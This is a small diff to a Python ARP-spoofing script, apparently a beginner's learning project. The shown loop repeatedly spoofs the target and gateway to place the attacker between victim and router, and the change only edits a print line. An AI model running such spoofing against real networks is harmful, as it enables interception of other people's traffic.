@@ -34,7 +34,7 @@ try: #this is a loop because it continuously has to keep spoofing ip's
         spoof(target_ip, gateway_ip) #this line and line below call spoof function
         spoof(gateway_ip, target_ip)
         sent_packets_count = sent_packets_count + 2 #adding two integer by 2 each time loop runs because it sends 2 packets each run through (one to router, one to victim)
-        print("\r\r[+] Packets Sent: " + str(sent_packets_count)), #comma at the end is used to tell the code what to print
+        print("\r[+] Packets Sent: " + str(sent_packets_count)), #comma at the end is used to tell the code what to print
         time.sleep(2) #adds a 2 second delay between each run of loop
 
 except KeyboardInterrupt:
